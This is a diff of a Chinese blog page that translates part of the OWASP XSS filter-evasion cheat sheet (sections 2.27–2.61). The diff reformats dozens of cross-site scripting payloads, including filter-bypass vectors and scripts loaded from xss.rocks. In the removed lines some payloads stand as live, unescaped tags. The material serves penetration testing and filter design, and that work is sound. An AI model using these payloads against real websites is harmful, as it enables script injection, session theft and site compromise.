-<a href="SCRIPT/SRC=”&lt;http://xss.rocks/xss.js">SCRIPT/SRC=”&lt;http://xss.rocks/xss.js</a>“&gt;
-
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SCRIPT/SRC=”&lt;http://xss.rocks/xss.js“&gt;&lt;/SCRIPT&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-28-额外的尖括号"><a href="#2-28-额外的尖括号" class="headerlink" title="2.28.    额外的尖括号"></a>2.28.    额外的尖括号</h3><p>由Franz Sedlmaier提交，这个XSS攻击向量可以绕过某些检测引擎，比如先查找第一个匹配的尖括号，然后比较里面的标签内容，而不是使用更有效的算法，例如Boyer-Moore算法就是查找整个字符串中的尖括号和相应标签（当然是通过模糊匹配）。双斜杠注释了额外的尖括号来防止出现JavaScript错误：</p>
-<blockquote>
-<p>&lt;<script>alert(“XSS”);//&lt;</script></p>
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;&lt;SCRIPT&gt;alert(“XSS”);//&lt;&lt;/SCRIPT&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-29-未闭合的script标签"><a href="#2-29-未闭合的script标签" class="headerlink" title="2.29.    未闭合的script标签"></a>2.29.    未闭合的script标签</h3><p>在Firefox和Netscape 8.1的Gecko渲染引擎下你不是必须构造类似“&gt;”的跨站脚本攻击向量。Firefox假定闭合HTML标签是安全的并且会为你添加闭合标记。多么体贴！不像不影响Firefox的下一个问题，这不需要在后面有额外的HTML标签。如果需要可以添加引号，但通常是没有必要的，需要注意的是，我并不知道这样注入后HTML会什么样子结束:</p>
-<blockquote>
-<p><script src="<http://xss.rocks/xss.js?">&lt; B &gt;</p>
-</blockquote>
-<h3 id="2-30-script标签中的协议解析"><a href="#2-30-script标签中的协议解析" class="headerlink" title="2.30.    script标签中的协议解析"></a>2.30.    script标签中的协议解析</h3><p>这个特定的变体是由Łukasz Pilorz提交的并且基于Ozh提供的协议解析绕过。这个跨站脚本示例在IE和Netscape的IE渲染模式下有效，如果添加了</script>标记在Opera中也可以。这在输入空间有限的情况下是非常有用的，你所使用的域名越短越好。”.j”是可用的，在SCRIPT标签中不需要考虑编码类型因为浏览器会自动识别。</p>
-<blockquote>
-<script src="//xss.rocks/.j">
-
-</blockquote>
-<h3 id="2-31-只含左尖括号的HTML-JavaScript-XSS向量"><a href="#2-31-只含左尖括号的HTML-JavaScript-XSS向量" class="headerlink" title="2.31.    只含左尖括号的HTML/JavaScript XSS向量"></a>2.31.    只含左尖括号的HTML/JavaScript XSS向量</h3><p>IE渲染引擎不像Firefox，不会向页面中添加额外数据。但它允许在IMG标签中直接使用javascript。这对构造攻击向量是很有用的，因为不需要闭合尖括号。这使得有任何HTML标签都可以进行跨站脚本攻击向量注入。甚至可以不使用”&gt;”闭合标签。注意：这会让HTML页面变得混乱，具体程度取决于下面的HTML标签。这可以绕过以下NIDS正则:/((\%3D)|(=))[^\n]*((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/因为不需要”&gt;”闭合。另外在实际对抗XSS过滤器的时候，使用一个半开放的&lt;IFRAME标签替代&lt;IMG标签也是非常有效的。</p>
-<blockquote>
-<p>&lt;IMG SRC=”javascript:alert(‘XSS’)”</p>
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;SCRIPT SRC=&lt;http://xss.rocks/xss.js?&gt;&lt; B &gt;</div></pre></td></tr></table></figure>
+<h3 id="2-30-script标签中的协议解析"><a href="#2-30-script标签中的协议解析" class="headerlink" title="2.30.    script标签中的协议解析"></a>2.30.    script标签中的协议解析</h3><p>这个特定的变体是由Łukasz Pilorz提交的并且基于Ozh提供的协议解析绕过。这个跨站脚本示例在IE和Netscape的IE渲染模式下有效，如果添加了<code>&lt;/SCRIPT&gt;</code>标记在Opera中也可以。这在输入空间有限的情况下是非常有用的，你所使用的域名越短越好。”.j”是可用的，在SCRIPT标签中不需要考虑编码类型因为浏览器会自动识别。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;SCRIPT SRC=//xss.rocks/.j&gt;</div></pre></td></tr></table></figure>
+<h3 id="2-31-只含左尖括号的HTML-JavaScript-XSS向量"><a href="#2-31-只含左尖括号的HTML-JavaScript-XSS向量" class="headerlink" title="2.31.    只含左尖括号的HTML/JavaScript XSS向量"></a>2.31.    只含左尖括号的HTML/JavaScript XSS向量</h3><p>IE渲染引擎不像Firefox，不会向页面中添加额外数据。但它允许在IMG标签中直接使用javascript。这对构造攻击向量是很有用的，因为不需要闭合尖括号。这使得有任何HTML标签都可以进行跨站脚本攻击向量注入。甚至可以不使用”&gt;”闭合标签。注意：这会让HTML页面变得混乱，具体程度取决于下面的HTML标签。这可以绕过以下NIDS正则:<code>/((\%3D)|(=))[^\n]*((\%3C)|&lt;)[^\n]+((\%3E)|&gt;)/</code>因为不需要”&gt;”闭合。另外在实际对抗XSS过滤器的时候，使用一个半开放的&lt;IFRAME标签替代&lt;IMG标签也是非常有效的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=”javascript:alert(‘XSS’)”</div></pre></td></tr></table></figure>
 <h3 id="2-32-多个左尖括号"><a href="#2-32-多个左尖括号" class="headerlink" title="2.32.    多个左尖括号"></a>2.32.    多个左尖括号</h3><p>使用一个左尖括号替代右尖括号作为标签结尾的攻击向量会在不同浏览器的Gecko渲染引擎下有不同表现。没有左尖括号时，在Firefox中生效，而在Netscape中无效。</p>
-<blockquote>
-<p><iframe src=<http://xss.rocks/scriptlet.html> &lt;</p>
-</blockquote>
-<h3 id="2-33-JavaScript双重转义"><a href="#2-33-JavaScript双重转义" class="headerlink" title="2.33.    JavaScript双重转义"></a>2.33.    JavaScript双重转义</h3><p>当应用将一些用户输入输出到例如：<SCRIPT>var a=”$ENV{QUERY_STRING}”;</script>的JavaScript中时，你想注入你的JavaScript脚本，你可以通过转义转义字符来规避服务器端转义引号。注入后会得到<script>vara=”\”;alert(‘XSS’);//”;</script>，这时双引号不会被转义并且可以触发跨站脚本攻击向量。XSS定位器就用了这种方法:<p></p>
-<blockquote>
-<p>\”;alert(‘XSS’);//</p>
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;iframe src=&lt;http://xss.rocks/scriptlet.html&gt; &lt;</div></pre></td></tr></table></figure>
+<h3 id="2-33-JavaScript双重转义"><a href="#2-33-JavaScript双重转义" class="headerlink" title="2.33.    JavaScript双重转义"></a>2.33.    JavaScript双重转义</h3><p>当应用将一些用户输入输出到例如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;SCRIPT&gt;var a=”$ENV&#123;QUERY_STRING&#125;”;&lt;/SCRIPT&gt;</div></pre></td></tr></table></figure>
+<p>的JavaScript中时，你想注入你的JavaScript脚本，你可以通过转义转义字符来规避服务器端转义引号。注入后会得到<code>&lt;SCRIPT&gt;vara=”\\”;alert(‘XSS’);//”;&lt;/SCRIPT&gt;</code>，这时双引号不会被转义并且可以触发跨站脚本攻击向量。XSS定位器就用了这种方法:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">\”;alert(‘XSS’);//</div></pre></td></tr></table></figure>
 <p>另一种情况是，如果内嵌数据进行了正确的JSON或JavaScript转义，但没有HTML编码，那可以结束原有脚本块并开始你自己的：</p>
-<blockquote>
-<p><script>alert(‘XSS’);</script></p>
-</blockquote>
-<h3 id="2-34-闭合title标签"><a href="#2-34-闭合title标签" class="headerlink" title="2.34.    闭合title标签"></a>2.34.    闭合title标签</h3><p>这是一个简单的闭合<title>标签的XSS攻击向量，可以包含恶意的跨站脚本攻击:</title></p>
-<blockquote>
-<p><script>alert(“XSS”);</script></p>
-</blockquote>
-<h3 id="2-35-INPUT-image"><a href="#2-35-INPUT-image" class="headerlink" title="2.35.    INPUT image"></a>2.35.    INPUT image</h3><blockquote>
-<input type="”IMAGE”" src="”javascript:alert(‘XSS’);”">
-
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;/script&gt;&lt;script&gt;alert(‘XSS’);&lt;/script&gt;</div></pre></td></tr></table></figure>
+<h3 id="2-34-闭合title标签"><a href="#2-34-闭合title标签" class="headerlink" title="2.34.    闭合title标签"></a>2.34.    闭合title标签</h3><p>这是一个简单的闭合<code>&lt;TITLE&gt;</code>标签的XSS攻击向量，可以包含恶意的跨站脚本攻击:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;/TITLE&gt;&lt;SCRIPT&gt;alert(“XSS”);&lt;/SCRIPT&gt;</div></pre></td></tr></table></figure>
+<h3 id="2-35-INPUT-image"><a href="#2-35-INPUT-image" class="headerlink" title="2.35.    INPUT image"></a>2.35.    INPUT image</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;INPUT TYPE=”IMAGE” SRC=”javascript:alert(‘XSS’);”&gt;</div></pre></td></tr></table></figure>
+<h3 id="2-36-BODY-image"><a href="#2-36-BODY-image" class="headerlink" title="2.36.    BODY image"></a>2.36.    BODY image</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;BODY BACKGROUND=”javascript:alert(‘XSS’)”&gt;</div></pre></td></tr></table></figure>
 <p>### </p>
-<p>### </p>
-<h3 id="2-36-BODY-image"><a href="#2-36-BODY-image" class="headerlink" title="2.36.    BODY image"></a>2.36.    BODY image</h3><blockquote>
-<body background="”javascript:alert(‘XSS’)”">
-
-</body></blockquote>
-<p>### </p>
-<p>### </p>
-<h3 id="2-37-IMG-Dynsrc"><a href="#2-37-IMG-Dynsrc" class="headerlink" title="2.37.    IMG Dynsrc"></a>2.37.    IMG Dynsrc</h3><blockquote>
-<img dynsrc="”javascript:alert(‘XSS’)”">
-
-</blockquote>
-<p>### </p>
-<p>### </p>
-<h3 id="2-38-IMG-lowsrc"><a href="#2-38-IMG-lowsrc" class="headerlink" title="2.38.    IMG lowsrc"></a>2.38.    IMG lowsrc</h3><blockquote>
-<img lowsrc="”javascript:alert(‘XSS’)”">
-
-</blockquote>
-<p>### </p>
-<p>### </p>
+<h3 id="2-37-IMG-Dynsrc"><a href="#2-37-IMG-Dynsrc" class="headerlink" title="2.37.    IMG Dynsrc"></a>2.37.    IMG Dynsrc</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG DYNSRC=”javascript:alert(‘XSS’)”&gt;</div></pre></td></tr></table></figure>
+<h3 id="2-38-IMG-lowsrc"><a href="#2-38-IMG-lowsrc" class="headerlink" title="2.38.    IMG lowsrc"></a>2.38.    IMG lowsrc</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG LOWSRC=”javascript:alert(‘XSS’)”&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-39-List-style-image"><a href="#2-39-List-style-image" class="headerlink" title="2.39.    List-style-image"></a>2.39.    List-style-image</h3><p>### </p>
 <p>处理嵌入的图片列表是很麻烦的问题。由于JavaScript指令的原因只能在IE渲染引擎下有效。不是一个特别有用的跨站脚本攻击向量:</p>
-<blockquote>
-<p><style>li {list-style-image: url(“javascript:alert(‘XSS’)”);}</style><ul><li>XSS<br></li></ul></p>
-</blockquote>
-<h3 id="2-40-图片中引用VBscript"><a href="#2-40-图片中引用VBscript" class="headerlink" title="2.40.    图片中引用VBscript"></a>2.40.    图片中引用VBscript</h3><blockquote>
-<img src="’vbscript:msgbox(“XSS”)’">
-
-</blockquote>
-<p>### </p>
-<p>### </p>
-<h3 id="2-41-Livescript-仅限旧版本Netscape"><a href="#2-41-Livescript-仅限旧版本Netscape" class="headerlink" title="2.41.    Livescript (仅限旧版本Netscape)"></a>2.41.    Livescript (仅限旧版本Netscape)</h3><blockquote>
-<p>&lt;IMG SRC=”livescript:[code]”&gt;</p>
-</blockquote>
-<p>### </p>
-<p>### </p>
-<h3 id="2-42-SVG对象标签"><a href="#2-42-SVG对象标签" class="headerlink" title="2.42.    SVG对象标签"></a>2.42.    SVG对象标签</h3><blockquote>
-<svg onload="alert('XSS')">
-
-</svg></blockquote>
-<p>### </p>
-<p>### </p>
-<h3 id="2-43-ECMAScript-6"><a href="#2-43-ECMAScript-6" class="headerlink" title="2.43.    ECMAScript 6"></a>2.43.    ECMAScript 6</h3><blockquote>
-<p>Set.constructor`alert\x28document.domain\x29```</p>
-</blockquote>
-<p>### </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;STYLE&gt;li &#123;list-style-image: url(“javascript:alert(‘XSS’)”);&#125;&lt;/STYLE&gt;&lt;UL&gt;&lt;LI&gt;XSS&lt;/br&gt;</div></pre></td></tr></table></figure>
+<h3 id="2-40-图片中引用VBscript"><a href="#2-40-图片中引用VBscript" class="headerlink" title="2.40.    图片中引用VBscript"></a>2.40.    图片中引用VBscript</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=’vbscript:msgbox(“XSS”)’&gt;</div></pre></td></tr></table></figure>
+<h3 id="2-41-Livescript-仅限旧版本Netscape"><a href="#2-41-Livescript-仅限旧版本Netscape" class="headerlink" title="2.41.    Livescript (仅限旧版本Netscape)"></a>2.41.    Livescript (仅限旧版本Netscape)</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG SRC=”livescript:[code]&quot;&gt;</div></pre></td></tr></table></figure>
+<h3 id="2-42-SVG对象标签"><a href="#2-42-SVG对象标签" class="headerlink" title="2.42.    SVG对象标签"></a>2.42.    SVG对象标签</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;svg/onload=alert(&apos;XSS&apos;)&gt;</div></pre></td></tr></table></figure>
+<h3 id="2-43-ECMAScript-6"><a href="#2-43-ECMAScript-6" class="headerlink" title="2.43.    ECMAScript 6"></a>2.43.    ECMAScript 6</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Set.constructor`alert\x28document.domain\x29``</div></pre></td></tr></table></figure>
 <p>### </p>
 <h3 id="2-44-BODY标签"><a href="#2-44-BODY标签" class="headerlink" title="2.44.    BODY标签"></a>2.44.    BODY标签</h3><p>这个方法不需要使用任何例如”javascript:”或”&lt;SCRIPT…”语句来完成XSS攻击。Dan Crowley特别提醒你可以在等号前加入一个空格(“onload=” != “onload =”):</p>
-<blockquote>
-<body onload="alert('XSS')">
-
-</body></blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;BODY ONLOAD=alert(&apos;XSS&apos;)&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-45-事件处理程序"><a href="#2-45-事件处理程序" class="headerlink" title="2.45.    事件处理程序"></a>2.45.    事件处理程序</h3><p>在XSS攻击中可使用以下事件（在完稿的时候这是网上最全的列表了）。感谢ReneLedosquet的更新。</p>
 <blockquote>
 <ol>
@@ -860,7 +688,7 @@
 <li>onReset() (用户或攻击者重置表单时触发)</li>
 </ol>
 <ol>
-<li>onResize() (用户改变窗口大小时，攻击者可以自动以这种方法触发:<script>self.resizeTo(500,400);</script>)</li>
+<li>onResize() (用户改变窗口大小时，攻击者可以自动以这种方法触发:<code>&lt;SCRIPT&gt;self.resizeTo(500,400);&lt;/SCRIPT&gt;)</code></li>
 </ol>
 <ol>
 <li>onResizeEnd() (用户完成改变窗体大小时触发)</li>
@@ -923,354 +751,138 @@
 <p>104.onURLFlip() (当一个高级流媒体格式（ASF）文件，由一个HTML+TIME（基于时间交互的多媒体扩展）媒体标签播放时，可触发在ASF文件中内嵌的攻击脚本)</p>
 <p>105.seekSegmentTime() (这是一个方法可以定位元素某个时间段内中的特定的点，并可以从该点播放。这个段落包含了一个重复的时间线，并包括使用AUTOREVERSE属性进行反向播放。)</p>
 </blockquote>
-<h3 id="2-46-BGSOUND"><a href="#2-46-BGSOUND" class="headerlink" title="2.46.    BGSOUND"></a>2.46.    BGSOUND</h3><blockquote>
-<bgsound src="javascript:alert('XSS');">
-
-</bgsound></blockquote>
+<h3 id="2-46-BGSOUND"><a href="#2-46-BGSOUND" class="headerlink" title="2.46.    BGSOUND"></a>2.46.    BGSOUND</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;BGSOUND SRC=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</div></pre></td></tr></table></figure>
+<h3 id="2-47-amp-JavaScript包含"><a href="#2-47-amp-JavaScript包含" class="headerlink" title="2.47.    &amp; JavaScript包含"></a>2.47.    &amp; JavaScript包含</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;BR SIZE=&quot;&amp;&#123;alert(&apos;XSS&apos;)&#125;&quot;&gt;</div></pre></td></tr></table></figure>
 <p>### </p>
-<p>### </p>
-<h3 id="2-47-amp-JavaScript包含"><a href="#2-47-amp-JavaScript包含" class="headerlink" title="2.47.    &amp; JavaScript包含"></a>2.47.    &amp; JavaScript包含</h3><blockquote>
-<br size="&{alert('XSS')}">
-
-</blockquote>
-<p>### </p>
-<p>### </p>
-<h3 id="2-48-样式表"><a href="#2-48-样式表" class="headerlink" title="2.48.    样式表"></a>2.48.    样式表</h3><blockquote>
-<link rel="stylesheet" href="javascript:alert('XSS');">
-
-</blockquote>
-<p>### </p>
-<p>### </p>
+<h3 id="2-48-样式表"><a href="#2-48-样式表" class="headerlink" title="2.48.    样式表"></a>2.48.    样式表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert(&apos;XSS&apos;);&quot;&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-49-远程样式表"><a href="#2-49-远程样式表" class="headerlink" title="2.49.    远程样式表"></a>2.49.    远程样式表</h3><p>### </p>
 <p>(利用像远程样式表一样简单的形式，你可以将XSS攻击代码包含在可使用内置表达式进行重定义的样式参数里。)这只在IE和使用IE渲染模式Netscape8.1+。注意这里没有任何元素在页面中表明这页面包含了JavaScript。提示：这些远程样式表都使用了body标签,所以必须在页面中有除了攻击向量以外的内容存在时才会生效, 也就是如果是空白页的话你必须在页面添加一个字母来让攻击代码生效:</p>
-<blockquote>
-<link rel="stylesheet" href="<http://xss.rocks/xss.css>">
-
-</blockquote>
-<h3 id="2-50-远程样式表2"><a href="#2-50-远程样式表2" class="headerlink" title="2.50.    远程样式表2"></a>2.50.    远程样式表2</h3><p>这个和上面一样有效，不过使用了<style>标签替代<LINK>标签. 这个细微的变化曾经用来攻击谷歌桌面。另一方面，如果在攻击向量后有HTML标签闭合攻击向量，你可以移除末尾的</style>标签。在进行跨站脚本攻击时，如不能同时使用等号或斜杠，这是非常有用的，这种情况在现实世界里不止一次发生了:</p>
-<blockquote>
-<p><style>@import’<a href="http://xss.rocks/xss.css">http://xss.rocks/xss.css</a>‘;</style></p>
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;&lt;http://xss.rocks/xss.css&gt;&quot;&gt;</div></pre></td></tr></table></figure>
+<h3 id="2-50-远程样式表2"><a href="#2-50-远程样式表2" class="headerlink" title="2.50.    远程样式表2"></a>2.50.    远程样式表2</h3><p>这个和上面一样有效，不过使用了<code>&lt;STYLE&gt;</code>标签替代<code>&lt;LINK&gt;</code>标签. 这个细微的变化曾经用来攻击谷歌桌面。另一方面，如果在攻击向量后有HTML标签闭合攻击向量，你可以移除末尾的<code>&lt;/STYLE&gt;</code>标签。在进行跨站脚本攻击时，如不能同时使用等号或斜杠，这是非常有用的，这种情况在现实世界里不止一次发生了:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;STYLE&gt;@import&apos;http://xss.rocks/xss.css&apos;;&lt;/STYLE&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-51-远程样式表3"><a href="#2-51-远程样式表3" class="headerlink" title="2.51.    远程样式表3"></a>2.51.    远程样式表3</h3><p>这种方式仅在Opera 8.0(9.x不可以)中有效，但方法比较有创意. 根据RFC2616，设置一个Link头部不是HTTP1.1规范的一部分,但一些浏览器仍然允许这样做 (例如Firefox和  Opera). 这里的技巧是设置一个头部（和普通头部并没有什么区别，只是设置Link: <a href="&lt;http://xss.rocks/xss.css">&lt;http://xss.rocks/xss.css</a>&gt;; REL=stylesheet）并且在远程样式表中包含使用了JavaScript的跨站脚本攻击向量，这一点是FireFox不支持的:</p>
-<blockquote>
-<meta http-equiv="Link" content="<<http://xss.rocks/xss.css>>; REL=stylesheet">
-
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;META HTTP-EQUIV=&quot;Link&quot; Content=&quot;&lt;&lt;http://xss.rocks/xss.css&gt;&gt;; REL=stylesheet&quot;&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-52-远程样式表4"><a href="#2-52-远程样式表4" class="headerlink" title="2.52.    远程样式表4"></a>2.52.    远程样式表4</h3><p>这仅能在Gecko渲染引擎下有效并且需要在父页面绑定一个XML文件。具有讽刺意味的是 Netscape认为Gecko更安全 ，所以对绝大多数网站来说会受到漏洞影响:</p>
-<blockquote>
-<style>BODY{-moz-binding:url(“<a href="http://xss.rocks/xssmoz.xml#xss">http://xss.rocks/xssmoz.xml#xss</a>“)}</style>
-
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;STYLE&gt;BODY&#123;-moz-binding:url(&quot;http://xss.rocks/xssmoz.xml#xss&quot;)&#125;&lt;/STYLE&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-53-含有分隔JavaScript的STYLE标签"><a href="#2-53-含有分隔JavaScript的STYLE标签" class="headerlink" title="2.53.    含有分隔JavaScript的STYLE标签"></a>2.53.    含有分隔JavaScript的STYLE标签</h3><p>这个XSS会在IE中造成无限循环:</p>
-<blockquote>
-<p><style>@im\port’\ja\vasc\ript:alert(“XSS”)’;</style></p>
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;STYLE&gt;@im\port&apos;\ja\vasc\ript:alert(&quot;XSS&quot;)&apos;;&lt;/STYLE&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-54-STYLE属性中使用注释分隔表达式"><a href="#2-54-STYLE属性中使用注释分隔表达式" class="headerlink" title="2.54.    STYLE属性中使用注释分隔表达式"></a>2.54.    STYLE属性中使用注释分隔表达式</h3><p>由Roman Ivanov创建</p>
-<blockquote>
-<img style="xss:expr/*XSS*/ession(alert('XSS'))">
-
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(alert(&apos;XSS&apos;))&quot;&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-55-含表达式的IMG-STYLE"><a href="#2-55-含表达式的IMG-STYLE" class="headerlink" title="2.55.    含表达式的IMG STYLE"></a>2.55.    含表达式的IMG STYLE</h3><p>这是一个将上面XSS攻击向量混合的方法，但确实展示了STYLE标签可以用相当复杂的方式分隔，和上面一样，也会让IE进入死循环:</p>
-<blockquote>
-<p>exp/<em>&lt;A STYLE=’no\xss:noxss(“</em>//*”);</p>
-<p>xss:ex/<em>XSS</em>//<em>/</em>/pression(alert(“XSS”))’&gt;</p>
-</blockquote>
-<h3 id="2-56-STYLE标签（仅旧版本Netscape可用）"><a href="#2-56-STYLE标签（仅旧版本Netscape可用）" class="headerlink" title="2.56.    STYLE标签（仅旧版本Netscape可用）"></a>2.56.    STYLE标签（仅旧版本Netscape可用）</h3><blockquote>
-<style type="text/javascript">alert(‘XSS’);</style>
-
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">exp/&lt;A STYLE=&apos;no\xss:noxss(&quot;//*&quot;);</div><div class="line"></div><div class="line">xss:ex/XSS////pression(alert(&quot;XSS&quot;))&apos;&gt;</div></pre></td></tr></table></figure>
+<h3 id="2-56-STYLE标签（仅旧版本Netscape可用）"><a href="#2-56-STYLE标签（仅旧版本Netscape可用）" class="headerlink" title="2.56.    STYLE标签（仅旧版本Netscape可用）"></a>2.56.    STYLE标签（仅旧版本Netscape可用）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;STYLE TYPE=&quot;text/javascript&quot;&gt;alert(&apos;XSS&apos;);&lt;/STYLE&gt;</div></pre></td></tr></table></figure>
 <p>### </p>
-<p>### </p>
-<h3 id="2-57-使用背景图像的STYLE标签"><a href="#2-57-使用背景图像的STYLE标签" class="headerlink" title="2.57.    使用背景图像的STYLE标签"></a>2.57.    使用背景图像的STYLE标签</h3><blockquote>
-<p><style>.XSS{background-image:url(“javascript:alert(‘XSS’)”);}</style><a class="XSS"></a></p>
-</blockquote>
-<p>### </p>
-<p>### </p>
-<h3 id="2-58-使用背景的STYLE标签"><a href="#2-58-使用背景的STYLE标签" class="headerlink" title="2.58.    使用背景的STYLE标签"></a>2.58.    使用背景的STYLE标签</h3><blockquote>
-<style type="text/css">BODY{background:url(“javascript:alert(‘XSS’)”)}</style>
-
-</blockquote>
-<p>### </p>
-<p>### </p>
+<h3 id="2-57-使用背景图像的STYLE标签"><a href="#2-57-使用背景图像的STYLE标签" class="headerlink" title="2.57.    使用背景图像的STYLE标签"></a>2.57.    使用背景图像的STYLE标签</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;STYLE&gt;.XSS&#123;background-image:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;);&#125;&lt;/STYLE&gt;&lt;A CLASS=XSS&gt;&lt;/A&gt;</div></pre></td></tr></table></figure>
+<h3 id="2-58-使用背景的STYLE标签"><a href="#2-58-使用背景的STYLE标签" class="headerlink" title="2.58.    使用背景的STYLE标签"></a>2.58.    使用背景的STYLE标签</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;STYLE type=&quot;text/css&quot;&gt;BODY&#123;background:url(&quot;javascript:alert(&apos;XSS&apos;)&quot;)&#125;&lt;/STYLE&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-59-含STYLE属性的HTML任意标签"><a href="#2-59-含STYLE属性的HTML任意标签" class="headerlink" title="2.59.    含STYLE属性的HTML任意标签"></a>2.59.    含STYLE属性的HTML任意标签</h3><p>IE6.0和IE渲染引擎模式下的Netscape 8.1+并不关心你建立的HTML标签是否存在，只要是由尖括号和字母开始的即可:</p>
-<blockquote>
-<xss style="behavior: url(xss.htc);">
-
-</xss></blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;XSS STYLE=&quot;behavior: url(xss.htc);&quot;&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-60-本地htc文件"><a href="#2-60-本地htc文件" class="headerlink" title="2.60.    本地htc文件"></a>2.60.    本地htc文件</h3><p>这和上面两个跨站脚本攻击向量有些不同，因为它使用了一个必须和XSS攻击向量在相同服务器上的.htc文件。这个示例文件通过下载JavaScript并将其作为style属性的一部分运行来进行攻击：</p>
-<blockquote>
-<xss style="behavior: url(xss.htc);">
-
-</xss></blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;XSS STYLE=&quot;behavior: url(xss.htc);&quot;&gt;</div></pre></td></tr></table></figure>
 <h3 id="2-61-US-ASCII编码"><a href="#2-61-US-ASCII编码" class="headerlink" title="2.61.    US-ASCII编码"></a>2.61.    US-ASCII编码</h3><p>US-ASCII编码（由Kurt Huwig发现）。它使用了畸形的7位ASCII编码来代替8位。这个XSS攻击向量可以绕过大多数内容过滤器，但是只在主机使用US-ASCII编码传输数据时有效，或者可以自己设置编码格式。相对绕过服务器端过滤，这在绕过WAF跨站脚本过滤时候更有效。Apache Tomcat是目前唯一已知使用US-ASCII编码传输的：</p>
-<blockquote>
-<p>¼script¾alert(¢XSS¢)¼/script¾</p>
-</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">¼script¾alert(¢XSS¢)¼/script¾</div></pre></td></tr></table></figure>
